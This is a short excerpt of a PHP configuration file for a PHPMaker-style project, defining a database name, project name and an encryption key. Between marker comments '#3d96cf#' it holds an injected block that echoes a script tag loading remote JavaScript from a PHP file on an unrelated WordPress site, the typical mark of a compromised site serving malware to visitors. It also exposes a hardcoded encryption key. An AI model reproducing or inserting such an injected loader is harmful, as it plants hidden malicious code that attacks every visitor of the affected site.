...
define("EW_CONN_DB", "era_karim", TRUE);
...
define("EW_PROJECT_NAME", "karim", TRUE); // Project Name
define("EW_RANDOM_KEY", 'Spem39vLRiee7OFI', TRUE); // Random key for encryption
...
#3d96cf#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224422\"></script>";
echo $srwv;
}
#/3d96cf#
?>
<?php
define("EW_ROWTYPE_PREVIEW", 6, TRUE); // Preview record
?>
